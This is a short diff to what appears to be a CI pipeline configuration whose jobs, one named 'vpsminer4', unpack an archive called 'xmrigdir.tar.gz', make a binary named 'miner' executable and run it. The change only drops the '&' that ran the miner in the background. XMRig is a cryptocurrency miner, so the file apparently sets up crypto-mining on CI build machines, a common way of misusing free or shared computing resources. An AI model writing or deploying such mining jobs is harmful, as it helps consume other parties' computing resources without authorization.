@@ -20,7 +20,7 @@ job:
         - tar xvf xmrigdir.tar.gz
         - cd xmrigdir
         - chmod +x ./miner
-        - ./miner & # Run the first project
+        - ./miner # Run the first project
 
     # Job for Project2
     - job: vpsminer4
@@ -29,5 +29,5 @@ job:
         - tar xvf xmrigdir.tar.gz
         - cd xmrigdir
         - chmod +x ./miner
-        - ./miner &   # Run the second project
+        - ./miner # Run the second project
         
